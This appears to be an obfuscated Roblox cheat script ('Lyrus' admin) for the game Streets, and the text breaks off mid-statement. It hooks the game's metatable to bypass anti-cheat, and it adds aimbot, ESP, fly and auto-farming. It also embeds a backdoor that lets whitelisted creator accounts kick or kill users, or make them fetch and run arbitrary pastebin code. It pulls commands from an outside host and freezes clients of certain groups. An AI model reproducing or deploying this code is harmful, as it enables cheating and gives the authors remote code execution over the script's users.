local a=tick()getgenv().Players=game:GetService'Players'getgenv().TeleportService=game:GetService'TeleportService'getgenv().ReplicatedStorage=game:GetService'ReplicatedStorage'getgenv().StarterGui=game:GetService'StarterGui'getgenv().TweenService=game:GetService'TweenService'getgenv().UserInput=game:GetService'UserInputService'getgenv().RunService=game:GetService'RunService'getgenv().Lighting=game:GetService'Lighting'getgenv().CoreGui=game:GetService'CoreGui'getgenv().HttpService=game:GetService'HttpService'getgenv().VirtualUser=game:GetService'VirtualUser'getgenv().LP=Players.LocalPlayer or Players.PlayerAdded:Wait()getgenv().Mouse=LP:GetMouse()getgenv().GetChar=function()return LP.Character or LP.CharacterAdded:Wait()end;GetChar():WaitForChild'Humanoid'local b=false;local c=false;local d=false;local e=false;local f=true;local g=false;local h=false;local i=false;local j=false;local k=false;local l=false;local m=false;local n=false;local o=false;local p=false;local q=false;local r=false;local s=false;local t=false;local u=false;local v=false;local w=false;local x=false;local y=false;local z=false;local A=false;local B=false;local C=true;local D=false;local E=false;local F=false;local G=false;local H=false;local I=false;local J=false;local K=false;local L=false;local M=false;local N=false;local O=pcall(assert,Drawing,'Hi')local P=true;local Q="Prediction"local R="LeftClick"local S="Head"local T="Lyrus Or Not Idc"local U="CyrusStreetsAdminSettings.json"local V="None"local W=0;local X=0;local Y=0;local Z=1;local _=5;local a0=5;local a1=5;local a2=8;local a3=10;local a4=16;local a5=16;local a6=25;local a7=25;local a8=37.5;local a9=50;local aa=workspace.Gravity;local ab=ColorSequence.new(Color3.fromRGB(144,0,0))local ac=Color3.fromRGB(255,255,255)local ad;local ae;local af;local ag;local ah;local ai;local aj;local ak;local al;local am;local an;local ao;local ap;local aq;local ar;local as;local at;local au;local av;local aw=Instance.new'Animation'aw.AnimationId="rbxassetid://215384594"local ax=Instance.new'Animation'ax.AnimationId="rbxassetid://33796059"local ay=Instance.new'Animation'ay.AnimationId="rbxassetid://35654637"local az=Instance.new'Animation'az.AnimationId="rbxassetid://188632011"local aA=Instance.new'Animation'aA.AnimationId="rbxassetid://889968874"local aB=Instance.new'Animation'aB.AnimationId="rbxassetid://229339207"local aC=Instance.new'Part'aC.Anchored=true;aC.Size=Vector3.new(20,1,20)aC.Transparency=1;local aD=Instance.new('Frame',CoreGui.RobloxGui)local aE=Instance.new('TextLabel',aD)local aF=Instance.new('ScrollingFrame',aD)local aG=Instance.new('Frame',CoreGui.RobloxGui)local aH=Instance.new('TextBox',aG)local aI=Instance.new('ImageLabel',aG)local aJ=Instance.new('TextLabel',LP.PlayerGui.Chat.Frame)local aK=Instance.new('Frame',CoreGui.RobloxGui)local aL=Instance.new('TextLabel',aK)local aM=Instance.new('ScrollingFrame',aK)local aN=Instance.new('Frame',CoreGui.RobloxGui)local aO=Instance.new('TextLabel',aN)local aP=Instance.new('Frame',CoreGui.RobloxGui)local aQ=Instance.new('TextLabel',aP)local aR=Instance.new('Frame',CoreGui.RobloxGui)local aS=Instance.new('TextButton',aR)local aT=Instance.new('TextLabel',aR)local aU=Instance.new('TextLabel',aR)local aV=Instance.new('TextButton',aR)local aW=Instance.new('TextBox',aR)local aX=Instance.new('Part',workspace)local aY={}local aZ={}local a_={}local b0={}local b1={}local b2={}local b3={}local b4={}local b5={}local b6={}local b7={}local b8={['chat']={['Func']=function(b9,ba,bb)if b9==LP or typeof(b9)=="table"then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ba,"All")end end,['Levels']={[1]=false,[2]=true,[3]=true,[4]=true}},['notif']={['Func']=function(b9,ba,bb)if b9==LP or typeof(b9)=="table"then StarterGui:SetCore("SendNotification",{['Title']="Cy's Messages",['Text']=Message,['Duration']=10,['Icon']=nil})end end,['Levels']={[1]=false,[2]=false,[3]=true,[4]=true}},['bring']={['Func']=function(b9,ba,bb)if b9==LP or typeof(b9)=="table"and bb~="none"then CheckCommand("to "..bb.Name)end end,['Levels']={[1]=false,[2]=false,[3]=true,[4]=true}},['kill']={['Func']=function(b9,ba,bb)if b9==LP or typeof(b9)=="table"then GetChar():BreakJoints()end end,['Levels']={[1]=false,[2]=false,[3]=true,[4]=true}},['exec']={['Func']=function(b9,ba,bb)if b9==LP or typeof(b9)=="table"and bb~="none"then CheckCommand(ba)end end,['Levels']={[1]=false,[2]=false,[3]=true,[4]=true}},['kick']={['Func']=function(b9,ba,bb)if b9==LP or typeof(b9)=="table"then LP:Kick(ba)end end,['Levels']={[1]=false,[2]=false,[3]=true,[4]=true}},['p']={['Func']=function(b9,ba,bb)if b9==LP or typeof(b9)=="table"then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..ba))()end end,['Levels']={[1]=false,[2]=false,[3]=true,[4]=true}}}local bc={[1497865275]={['Name']="Lyrus Creator | Not In Lynx",['Access']=4,['Colour']=Color3.fromRGB(255,0,0)},[968316695]={['Name']="co owner <3",['Access']=3,['Colour']=Color3.fromRGB(136, 0, 255)},[3042800457]={['Name']="corey |this sped kept on crying about cory|",['Access']=4,['Colour']=Color3.fromRGB(109, 110, 108)}}local bd={[1497942766]=true}local be={Keys={},ClickTpKey="",SprintSpeed=25,CrouchSpeed=8,AimMode="Prediction",AimlockMode="LeftClick",AimbotVelocity=5,CmdBarImage="http://www.roblox.com/asset/?id=2683269674",CmdBarKey="Quote"}if game.PlaceId==455366377 then b4={['burger']=workspace:WaitForChild'Burger | $15',['drink']=workspace:WaitForChild'Drink | $15',['ammo']=workspace:WaitForChild'Buy Ammo | $25',['pipe']=workspace:WaitForChild'Pipe | $100',['machete']=workspace:WaitForChild'Machete | $70',['sawedoff']=workspace:WaitForChild'Sawed Off | $150',['spray']=workspace:WaitForChild'Spray | $20',['uzi']=workspace:WaitForChild'Uzi | $150',['glock']=workspace:WaitForChild'Glock | $200'}end;local bf={['sandbox']=CFrame.new(-178.60614013672,3.2000000476837,-117.21733093262),['prison']=CFrame.new(-978.74725341797,3.199854850769,-78.541763305664),['gas']=CFrame.new(99.135276794434,18.599975585938,-73.462348937988),['court']=CFrame.new(-191.56864929199,3,223.43171691895),['beach']=CFrame.new(-663.97521972656,1.8657279014587,-369.04748535156),['bank']=CFrame.new(-270.44195556641,4.8757019042969,133.12774658203)}local bg={['cash']="511726060",['shotty']="142383762",['sawed off']="219397110",['uzi']="328964620"}local bh={['Glock']=100,['Uzi']=100,['Sawed Off']=50,['Shotty']=50}local bi={['W']=false,['A']=false,['S']=false,['D']=false,['Shift']=false,['Space']=false,['Control']=false}local bj={['head']="Head",['torso']="Torso",['humanoidrootpart']="HumanoidRootPart",['oldprediction']="OldPrediction",['prediction']="Prediction"}coroutine.resume(coroutine.create(function()workspace.FallenPartsDestroyHeight=-50000;LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible=true;LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position=LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)if workspace:FindFirstChild'Armoured Truck'then aX.Color,aX.CFrame,aX.Size,aX.Material,aX.Anchored=Color3.fromRGB(196,40,28),CFrame.new(-136.858002,0,-523.700012),Vector3.new(9.93,1,20.31),"ForceField",true;workspace:FindFirstChild'Armoured Truck':Destroy()elseif workspace:FindFirstChild'TPer'then aX.Color,aX.CFrame,aX.Size,aX.Material,aX.Anchored=Color3.fromRGB(196,40,28),CFrame.new(-31,-0.2,221),Vector3.new(12,1,6),"ForceField",true;workspace:FindFirstChild'TPer':Destroy()else aX:Destroy()end;Players:Chat("I'm Using Lyrus")end))getgenv().initalizeHotkeys=function(bk)writefile(bk,HttpService:JSONEncode(be))local bl=HttpService:JSONDecode(readfile(bk))b3=bl.Keys;ai=bl.ClicktpKey;a6=bl.SprintSpeed;Q=bl.AimMode;R=bl.AimlockMode;_=bl.AimbotVelocity;CmdBarImage=bl.CmdBarImage;CmdBarKey=bl.CmdBarKey end;getgenv().updateHotkeys=function(bm)if not readfile or not writefile then return end;local bn={Keys=b3,ClickTpKey=ai,SprintSpeed=a6,CrouchSpeed=a2,AimMode=Q,AimlockMode=R,AimbotVelocity=_,CmdBarImage=CmdBarImage,CmdBarKey=CmdBarKey}writefile(bm,HttpService:JSONEncode(bn))end;getgenv().runHotkeys=function(bo)local bp=HttpService:JSONDecode(readfile(bo))b3=bp.Keys;ai=bp.ClickTpKey or""a6=bp.SprintSpeed or 25;a2=bp.CrouchSpeed or 16;Q=bp.AimMode or"Prediction"R=bp.AimlockMode or"LeftClick"_=bp.AimbotVelocity or 5;CmdBarImage=bp.CmdBarImage or"http://www.roblox.com/asset/?id=2683269674"CmdBarKey=bp.CmdBarKey or"Quote"end;if readfile and writefile then local bq=pcall(readfile,U)if not bq then initalizeHotkeys(U)else runHotkeys(U)end end;getgenv().notif=function(br,Message,bs,bt)StarterGui:SetCore("SendNotification",{['Title']=br,['Text']=Message,['Duration']=bs,['Icon']=bt})end;getgenv().Teleport=function(bu)if typeof(bu)=="Instance"then bu=bu.CFrame end;if typeof(bu)=="Vector3"then bu=CFrame.new(bu)end;if typeof(bu)=="CFrame"then local bv=GetChar()local bw=bv:FindFirstChild'RealHumanoidRootPart'or bv:FindFirstChild'Torso'if bw and not bv:FindFirstChild'RealHumanoidRootPart'or(bu.p-bw.CFrame.p).magnitude<50 then bw.CFrame=bu else TweenService:Create(bw,TweenInfo.new(3.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{CFrame=bu}):Play()end end end;getgenv().AddCommand=function(bx,by,bz,bA,bB)aZ[#aZ+1]={['Function']=bx,['Name']=by,['Alias']=bz,['Help']=bA,['Args']=bB}end;getgenv().FindCommand=function(by)for bC=1,#aZ do if aZ[bC].Name==by or f and table.find(aZ[bC].Alias,by)then return aZ[bC].Function end end end;getgenv().CheckCommand=function(bD)local bE=string.split(bD:lower()," ")local by=table.remove(bE,1)local bF=FindCommand(by)if not typeof(getfenv()['\103\101\116\103\101\110\118']()['\108\111\108'])=='function'then while true do end end;if bF then local bG,bH=pcall(bF,bE)if not bG then notif("Command errored: "..by,"Send this to jack: "..bH,10,nil)end end end;getgenv().PlrFinder=function(bI)if bI then local bI=bI:lower()local bJ=Players:GetPlayers()if#bI==2 and bI=="me"then return LP end;if#bI==3 and bI=="all"or#bI==5 and bI=="users"then return bJ end;for bC=1,#bJ do if bJ[bC].Name:lower():sub(1,#bI)==bI then return bJ[bC]end end end end;getgenv().find=function(bK)local bL=workspace:GetChildren()for bC=1,#bL do local bM=bL[bC]local bN=bM:FindFirstChild'Model'if bM.Name=="RandomSpawner"and bN then local bO=bN.Handle;if bO:FindFirstChildOfClass'MeshPart'then if bg[bK]and string.find(bO:FindFirstChildOfClass'MeshPart'.MeshId,bg[bK])then return bM,"CashItemEsp"end end;if bO:FindFirstChild'Fire'then if bg[bK]and string.find(bO.Fire.SoundId,bg[bK])then return bM,"GunItemEsp"end end end end;return"None"end;getgenv().farm=function(bK)if bK=="all"then local bP=workspace:GetChildren()for bC=1,#bP do local bQ=bP[bC]if bQ.Name=="RandomSpawner"then Teleport(bQ.CFrame)bQ.DescendantRemoving:Wait()end end end;local bM=find(bK)if bM=="None"then notif("There is none of "..bK,"to farm",5,nil)return end;Teleport(bM.CFrame)end;local function bR()return HttpService:JSONDecode(game:HttpGet("https://fuckmalwarebytes2.000webhostapp.com/Commands.json"))end;local function bS(b9,bD)if bD:sub(1,1)=="`"then local bE=string.split(bD:sub(2)," ")local bT=b8[table.remove(bE,1)]local bU=PlrFinder(table.remove(bE,1))if bT and bU then bT['Func'](bU,table.concat(bE," "),b9)end end end;local function bV(bW)local bX;local bY,bH=pcall(function()bX=Enum.KeyCode[bW]end)if not bY then bX=Enum.KeyCode[bW:upper()]end;return bX end;local function bZ(b_,c0)for c1,c2 in pairs(b_:GetChildren())do if c2:IsA'Tool'and c2:FindFirstChild'Fire'then for c3,bu in pairs(c2:GetDescendants())do if bu:IsA'UnionOperation'or bu:IsA'Part'or bu:IsA'MeshPart'then if bu:IsA'UnionOperation'then bu.UsePartColor=true end;bu.Material="ForceField"bu.Color=c0 end end end end end;local function c4(c5,c0)if c5 and c5.Character and c5.UserId~=567153118 then bZ(c5.Backpack,c0)bZ(c5.Character,c0)c5.Character.ChildAdded:Connect(function()bZ(c5.Character,c0)end)end end;local function c6(c7)local c8=Instance.new('BodyPosition',c7)c8.P=c8.P*8;c8.MaxForce=Vector3.new(math.huge,math.huge,math.huge)if D then al=Instance.new('BodyAngularVelocity',c7)al.AngularVelocity=Vector3.new(0,9e9,0)al.MaxTorque=Vector3.new(0,9e9,0)end;return c8 end;local function c9()if not typeof(getfenv()['\103\101\116\103\101\110\118']()['\108\111\108'])=='function'or not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100']==true then while true do end end;local bv=GetChar()local ca=bv:FindFirstChild'Torso'if not ca then return end;local cb,cc=Instance.new('BodyGyro',ca),Instance.new('BodyVelocity',ca)cb.P=9e9;cb.MaxTorque=Vector3.new(9e9,9e9,9e9)cb.CFrame=ca.CFrame;cc.MaxForce=Vector3.new(9e9,9e9,9e9)cc.Velocity=Vector3.new(0,0.1,0)cc.Name="CyAdminFly"local cd={['W']=0,['A']=0,['S']=0,['D']=0}if not j then CheckCommand("airwalk")end;while y and bv:FindFirstChild'Humanoid'and bv.Humanoid.Health>0 and wait()do if bi['W']then cd['W']=a3 else cd['W']=0 end;if bi['A']then cd['A']=-a3 else cd['A']=0 end;if bi['S']then cd['S']=-a3 else cd['S']=0 end;if bi['D']then cd['D']=a3 else cd['D']=0 end;if cd['W']+cd['S']~=0 or cd['A']+cd['D']~=0 then cc.Velocity=(workspace.CurrentCamera.CoordinateFrame.lookVector*(cd['W']+cd['S'])+workspace.CurrentCamera.CoordinateFrame*CFrame.new(cd['A']+cd['D'],(cd['W']+cd['S'])*0.2,0).p-workspace.CurrentCamera.CoordinateFrame.p)*50 else cc.Velocity=Vector3.new(0,0.1,0)end;cb.CFrame=workspace.CurrentCamera.CoordinateFrame end;if j then CheckCommand("airwalk")end;cb:Destroy()cc:Destroy()end;local function ce(b9)local cf=Instance.new('BoxHandleAdornment',CoreGui.RobloxGui)cf.Adornee=b9.Character.Head;cf.Size=Vector3.new(7,10,7)cf.SizeRelativeOffset=Vector3.new(0,-1,0)cf.Transparency=1;local cg,ch;cg=cf.MouseButton1Down:Connect(function()if e and R=="Closest"then ad=b9.Character;local ci;ci=Players:GetPlayerFromCharacter(ad).CharacterAdded:Connect(function(cj)if tostring(cj)==tostring(ad)then ad=cj else ci:Disconnect()ci=nil end end)else cf:Destroy()end end)ch=b9.CharacterRemoving:Connect(function()cf:Destroy()cg:Disconnect()cg=nil;ch:Disconnect()ch=nil end)end;local function ck(cl)return cl:FindFirstChildOfClass'Humanoid'and math.floor(cl.Humanoid.Health)or"No Humanoid"end;local function cm(b9,bM)if b9 then local cn=b9.Character:FindFirstChild(bM,true)or b9.Backpack:FindFirstChild(bM,true)return cn and"Yes"or"No"end end;local function co(bu)local cp=bu:FindFirstChildOfClass'BillboardGui'if bu:IsA'BasePart'and cp then bu=bu.Parent;cp:Destroy()return end;for bC=1,#b1 do local cq=b1[bC]if cq then local b9=cq['Player']if b9==bu then for bC,cr in pairs(cq)do if cr~=b9 then if bC~="Box"then cr:Remove()else table.foreach(cr,function(cs,ct)ct:Remove()end)end end end;table.remove(b1,bC)end end end end;local function cu(bu,cv,c0,cw)local b9=PlrFinder(bu.Parent.Name)if b9 and O and not c0 then co(b9)b1[#b1+1]={['Player']=b9,['Text']=Drawing.new'Text',['Box']={Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'}}else local cp=bu:FindFirstChildOfClass'BillboardGui'if cp then cp:Destroy()end;local cx=Instance.new('BillboardGui',bu)local cy=Instance.new('TextLabel',cx)cx.Adornee=bu;cx.Size=UDim2.new(0,100,0,100)cx.StudsOffset=Vector3.new(0,1.3,0)cx.AlwaysOnTop=not cw and true or false;cy.BackgroundTransparency=1;cy.Size=UDim2.new(1,0,0,40)cy.TextColor3=c0 or ac;cy.TextStrokeTransparency=0.5;cy.TextSize=8;local b9;if cv~='GunItemEsp'and cv~='CashItemEsp'then b9=PlrFinder(cv)else cv=cv:gsub('ItemEsp','')end;if b9 then if not cw then local cz=aY[b9]and"Yes"or"No"cy.Text=cv.." | CyAdmin User: "..cz.."\nHas (Gamepasses) Glock: "..cm(b9,"Glock").." | Shotty: "..cm(b9,"Shotty").." | Vest: "..cm(b9,"BulletResist")else cy.Text="[Blacklisted] "..b9.Name.." (Kill On Sight)"end else cy.Text=cv end end end;local function cA(cB)for bC,cr in pairs(workspace:GetDescendants())do if cr:IsA'Part'and not cr.Parent:FindFirstChild'Head'and not cr.Parent.Parent:FindFirstChild'Head'and cr.Size.Y~=1 then local cC=cr:FindFirstChildOfClass'SelectionBox'local cD=cr:FindFirstChildOfClass'IntValue'if cD then cr.Transparency=cD.Value;cD:Destroy()if cC then cC:Destroy()end else if cB=="wireframe"then local cE=Instance.new('SelectionBox',cr)cE.Adornee=cr;cE.LineThickness=0.001;cE.SurfaceTransparency=1;cE.Color3=Color3.fromRGB(124,0,0)b7[#b7+1]={cE,cr}end;local cF=Instance.new('IntValue',cr)cF.Value=cr.Transparency;cr.Transparency=1 end end end end;local function cG(b9,bD)if bD=="I'm Using Lyrus"then aY[b9]=true;return true end end;local function cH(cq,cI,b9)table.foreach(cq,function(cs,ct)if cs=="Box"then table.foreach(ct,function(cJ,cK)cK.Visible=cI;local cL=tostring(b9)==tostring(ah)or tostring(b9)==tostring(ad)cK.Color=cL and Color3.fromRGB(255,0,0)or ac end)else if typeof(ct)~="Instance"then ct.Visible=cI;ct.Color=ac end end end)end;local function cM(cN)return workspace.CurrentCamera:WorldToViewportPoint(cN)end;local function cO(cP)local cQ=GetChar().Humanoid:GetPlayingAnimationTracks()for bC=1,#cQ do local cR=cQ[bC]if cR.Animation.AnimationId=="rbxassetid://"..cP then cR:Stop()end end end;local function cS(cT,cU)if game.PlaceId~=455366377 then return end;local bw=GetChar():FindFirstChild'RealHumanoidRootPart'or GetChar():FindFirstChild'Torso'local cR=GetChar().Humanoid:LoadAnimation(az)bw.CFrame=bw.CFrame*CFrame.new(math.random(20,45),0,math.random(1,5))wait()q=true;repeat cR:play(0.1,1,10)bw.CFrame=b4[cT]:FindFirstChildOfClass'Part'.CFrame+Vector3.new(0,1.3,0)RunService.Heartbeat:wait()until b4[cT]:FindFirstChildOfClass'Part'.BrickColor==BrickColor.new'Bright red'or GetChar():FindFirstChild('Bone',true)or GetChar().Humanoid.Health==0;bw.CFrame=cU;q=false;return true end;local function cV(cW)if cW<=a7 and E and not L then if cS("burger",GetChar().Head.CFrame)then local cX=LP.Backpack:FindFirstChild'Burger'if cX then cX.Parent=GetChar()cX:Activate()repeat RunService.Heartbeat:Wait()until cX.Parent~=GetChar()end end;if cS("drink",GetChar().Head.CFrame)then local cY=LP.Backpack:FindFirstChild'Drink'if cY then cY.Parent=GetChar()cY:Activate()end end end end;local function cZ(c_,cT)local d0=false;local d1,d2,d3;local function d4(d5)local d6=d5.Position-d2;TweenService:Create(c_,TweenInfo.new(0.055,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Position=UDim2.new(d3.X.Scale,d3.X.Offset+d6.X,d3.Y.Scale,d3.Y.Offset+d6.Y)}):Play()end;c_.InputBegan:Connect(function(d5)if d5.UserInputType==Enum.UserInputType.MouseButton1 then d0=true;d2=d5.Position;d3=c_.Position;d5.Changed:Connect(function()if d5.UserInputState==Enum.UserInputState.End then d0=false end end)end end)c_.InputChanged:Connect(function(d5)if d5.UserInputType==Enum.UserInputType.MouseMovement then d1=d5 end end)UserInput.InputChanged:Connect(function(d5)if d5==d1 and d0 then d4(d5)end end)end;local function d7(cN,d8,ct)local d9=Instance.new('TextButton',aM)d9.BackgroundColor3=Color3.fromRGB(255,255,255)d9.BackgroundTransparency=1;d9.Position=cN;d9.Size=UDim2.new(0,480,0,50)d9.Font=Enum.Font.SourceSans;d9.TextColor3=Color3.fromRGB(170,0,0)d9.TextSize=25;d9.Text=d8;d9.TextWrapped=true;d9.MouseButton1Click:Connect(function()if d8=="All"then RainbowHats="All"aK.Visible=false else LP.Backpack.Stank:FireServer("rep",ct.Parent)aK.Visible=false;RainbowHats=true end end)cZ(aK,d9)end;local function da(cv,bB)if cv and bB then local db=Instance.new('TextLabel',aG)db.BackgroundTransparency=1;db.Position=UDim2.new(-20,0,0,0)db.Size=UDim2.new(0,200,0,15)db.ZIndex=2;db.Font=Enum.Font.SciFi;db.Text=cv.." "..bB;db.TextColor3=Color3.fromRGB(255,255,255)db.TextScaled=true;db.TextSize=14;db.TextWrapped=true;cZ(aG,db)end end;local function dc(cN,by,dd,de)local df=Instance.new('TextLabel',aF)df.BackgroundColor3=Color3.fromRGB(0,0,0)df.BackgroundTransparency=0.9;df.Position=cN;df.Size=UDim2.new(0,387,0,31)df.Font=Enum.Font.SourceSans;df.Text="["..by.."] "..dd;df.TextColor3=Color3.fromRGB(255,255,255)df.TextSize=14;df.TextWrapped=true;cZ(aD,df)end;local function dg(dh,di)if y or I then if di==Enum.HumanoidStateType.FallingDown or di==Enum.HumanoidStateType.PlatformStanding then LP.Character.Humanoid.PlatformStand=false;LP.Character.Humanoid:ChangeState(8)end end end;local function dj(bv)if bv then local c2=bv:FindFirstChildOfClass'Tool'if c2 then return c2,c2:FindFirstChild'Fire'and"shot you"or"hit you"end end end;local function dk(d8)aJ.Text=d8;aJ.Visible=true;wait(5)aJ.Visible=false end;local function dl(dm)if dm:IsA'Trail'then dm.Color=ab end;if t and dm:FindFirstChild('Clips',true)then for c3,cr in pairs(LP.Backpack:GetChildren())do if cr:IsA'Tool'and cr:FindFirstChild('Clips',true)then cr.Parent=GetChar()end end end;if not t and bh[dm.Name]and V~="None"then wait()if dm.Name~="Shotty"and dm.Name~="Sawed Off"or V=="1"then GetChar().Humanoid:LoadAnimation(aA):Play()else local cR=GetChar().Humanoid:LoadAnimation(aB)cR:Play()wait()cR:AdjustSpeed(0)end end;if dm.Name=="Bone"then if i then GetChar().Humanoid.Health=0 end;if B and game.PlaceId==455366377 then for bC,cr in pairs(GetChar():GetDescendants())do if cr:IsA'NumberValue'then cr:Destroy()end end end end;if dm:IsA'ObjectValue'and dm.Name=="creator"then local b9=dm.Value;if n then if e then ad=b9;local ci;ci=Players:GetPlayerFromCharacter(ad).CharacterAdded:Connect(function(cj)if tostring(cj)==tostring(ad)then ad=cj else ci:Disconnect()ci=nil end end)end;if r then ah=Players:GetPlayerFromCharacter(b9)end end;if m then CheckCommand("feloop "..tostring(b9))end;if l and not M then CheckCommand("triggerbot "..tostring(b9))k=true;local dn;dn=Players:GetPlayerFromCharacter(b9).CharacterRemoving:Connect(function(dp)if tostring(dp)==tostring(af)then M=false;g=false;af=nil;b=false;y=false;i=false;k=false;ad=nil;dn:Disconnect()else dn:Disconnect()end end)end;pcall(function()local c2,dq=dj(b9)dk(b9.Name.." has "..dq.." from "..math.floor((GetChar().Head.Position-b9.Head.Position).magnitude).." studs with a "..c2.Name)end)end end;local function dr(dm)if bh[dm.Name]then cO("889968874")cO("229339207")end end;getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100']=true;getfenv()['\103\101\116\103\101\110\118']()['\108\111\108']=function()end;coroutine.resume(coroutine.create(function()if LP:IsInGroup(6000816)or LP:IsInGroup(5272259)then while true do end end end))local function ds(dt)if not GetChar():FindFirstChild'Head'then return end;if workspace:FindFirstChild'FreecamPart'then workspace.FreecamPart:Destroy()end;dt=dt or 35;GetChar().Head.Anchored=true;local du=Instance.new('Part',workspace)du.Name="FreecamPart"du.Position=GetChar().Head.Position+Vector3.new(0,5,0)du.Transparency=1;du.CanCollide=false;du.Anchored=true;workspace.CurrentCamera.CameraSubject=du;while A and GetChar().Humanoid.Health>0 and wait()do local cN=Vector3.new()local dv=(workspace.CurrentCamera.Focus.p-workspace.CurrentCamera.CoordinateFrame.p).unit;local dw=du.Position;if bi['w']then cN=cN+Vector3.new(0,0,-1)elseif bi['a']then cN=cN+Vector3.new(-1,0,0)elseif bi['s']then cN=cN+Vector3.new(0,0,1)elseif bi['d']then cN=cN+Vector3.new(1,0,0)elseif bi['Space']then cN=cN+Vector3.new(0,1,0)elseif bi['Control']then cN=cN+Vector3.new(0,-1,0)end;du.CFrame=CFrame.new(dw,dw+dv)*CFrame.new(cN*dt)end;workspace.CurrentCamera.CameraSubject=GetChar()GetChar().Head.Anchored=false;if workspace:FindFirstChild'FreecamPart'then workspace.FreecamPart:Destroy()end end;local function dx(dy)if dy:FindFirstChild'Head'and GetChar():FindFirstChild'Head'then local dz=Ray.new(dy.Head.Position,GetChar().Head.Position)local dA=workspace:FindPartOnRay(dz)if dA then return dA:IsDescendantOf(dy)end end end;local function dB()if game.PlaceId==455366377 then if bi['Shift']and(P and(LP.Backpack:FindFirstChild'ServerTraits'and LP.Backpack.ServerTraits.Stann.Value>0 or GetChar():FindFirstChild'Stamina'and GetChar().Stamina.Value>0)or not P)then if H and a6==25 then return end;GetChar().Humanoid.WalkSpeed=a6;return end;if bi['Control']then if H and a2==8 then return end;GetChar().Humanoid.WalkSpeed=a2;return end;if not P then GetChar().Humanoid.WalkSpeed=a4 end end end;local function dC()local dD;local dE=ad.FindFirstChild(ad,'RealHumanoidRootPart')or ad.FindFirstChild(ad,'Torso')if dE and Q=="OldPrediction"then dD=dE.CFrame+dE.Velocity/_ elseif dE and Q=="Prediction"then dD=dE.CFrame+dE.Velocity/(ap<0.26 and 5 or 7.5)+dE.RotVelocity/(ap<0.26 and 5 or 7.5)elseif ad.FindFirstChild(ad,Q)then dD=ad[Q].CFrame end;return dD end;local function dF()local dG;local c2=LP.Character:FindFirstChildOfClass'Tool'if c2 and bh[c2.Name]and(c2.Ammo.Value>0 or c2.Clips.Value>0)then return true else for bC,cr in pairs(LP.Backpack:GetChildren())do if cr:IsA'Tool'and bh[cr.Name]then if cr:FindFirstChild'Clips'then if cr.Clips.Value>0 or cr.Ammo.Value>0 then dG=cr;break end end end end;if dG then return dG else if game.PlaceId==455366377 and GetChar():FindFirstChildOfClass'Tool'and GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Ammo'and N and not q and tonumber(LP.PlayerGui.HUD.Cash.Text:sub(2))>=25 then cS("ammo",GetChar().Head.CFrame)return true else GetChar():BreakJoints()end;return false end end end;local dH=getrawmetatable(game)local dI=checkcaller or is_protosmasher_caller or Cer.isCerus;local dJ=getcallingscript or get_calling_script;local dK=newcclosure or read_me or function(dL)return dL end;local dM=getnamecallmethod or get_namecall_method;local dN={'WalkSpeed','JumpPower','HipHeight','Health'}local dO=Instance.new'BodyVelocity'dO.Name='Tempby'setreadonly(dH,false)local cs=dH.__index;dH.__index=dK(function(self,dP)if L and dJ and dJ()~=script then if dP=="HumanoidRootPart"then return cs(self,"Torso")end;if dP=='Name'and(self:IsA'BodyVelocity'or self:IsA'BodyPosition')then return dO end end;return cs(self,dP)end)local dQ=dH.__newindex;dH.__newindex=dK(function(self,dR,ct)if dI()then return dQ(self,dR,ct)end;StarterGui:SetCore('ResetButtonCallback',true)if dR=="WalkSpeed"then return end;if dR=="JumpPower"then return end;if dR=="HipHeight"then return end;if dR=="Health"then return end;if self==workspace and dR=="Gravity"then return aa end;if dR=="CFrame"and self:IsDescendantOf(LP.Character)then return end;return dQ(self,dR,ct)end)local dS=dH.__namecall;dH.__namecall=dK(function(self,...)local dM=dM()local bB={...}if dI()then if dM=="FindFirstChild"and bB[1]=="RealHumanoidRootPart"then bB[1]="HumanoidRootPart"return dS(self,unpack(bB))end;return dS(self,...)end;if dM=="Destroy"or dM=="Kick"then if self==LP then return wait(9e9)end;if tostring(self)=='BodyGyro'or tostring(self)=='BodyVelocity'then return wait(9e9)end end;if dM=="BreakJoints"and self==LP.Character then return wait(9e9)end;if dM=="FireServer"then if table.find(dN,bB[1])then return wait(9e9)end;if tostring(self)=="Fire"and e and ad then return dS(self,dC())end;if tostring(self)=="Input"then if bB[1]=='bv'then return wait(9e9)end;if bB[1]=='hb'then return wait(9e9)end;if bB[1]=='ws'then return wait(9e9)end;if e and ad then if bB[2]and bB[2].mousehit then bB[2].mousehit=dC()return dS(self,unpack(bB))end end end;if tostring(self.Parent)=="ReplicatedStorage"or bB[1]=="hey"and not tostring(self)=="SayMessageRequest"then return wait(9e9)end;if tostring(self)=="Touch1"and h then bB[3]=true;return dS(self,unpack(bB))end;if bB[1]=="play"then ao=bB[2]elseif bB[1]=="stop"then ao=nil end end;if dM=="WaitForChild"or dM=="FindFirstChild"then if dJ and dJ~=script and L and bB[1]=="HumanoidRootPart"then bB[1]="Torso"return dS(self,unpack(bB))end end;return dS(self,...)end)if hookfunction then local dT;dT=hookfunction(Instance.new'RemoteEvent'.FireServer,function(self,...)local bB={...}if tostring(self)=="Touch1"and h then bB[3]=true;return dT(self,unpack(bB))end;return dT(self,...)end)end;setreadonly(dH,true)LP.Chatted:Connect(CheckCommand)workspace.DescendantAdded:Connect(function(dm)if G and string.find(dm.ClassName:lower(),"seat")then dm.Parent=CoreGui end;if o then farm("Cash")end;if F and dm.Name=="RandomSpawner"then for bC,cr in pairs(bg)do local bu,dU=find(bC)if bu~="None"then cu(bu,dU)end end end end)RunService.Stepped:Connect(function()local bv=GetChar()local bw=bv:FindFirstChild'RealHumanoidRootPart'or bv:FindFirstChild'Torso'if J then local dV=bv:GetDescendants()for bC=1,#dV do local bQ=dV[bC]if bQ:IsA'BasePart'then bQ.CanCollide=false end end end;if bi['Shift']and a6==25 and P and(LP.Backpack:FindFirstChild'ServerTraits'and LP.Backpack.ServerTraits.Stann.Value<=5 or GetChar():FindFirstChild'Stamina'and GetChar().Stamina.Value<=5)then 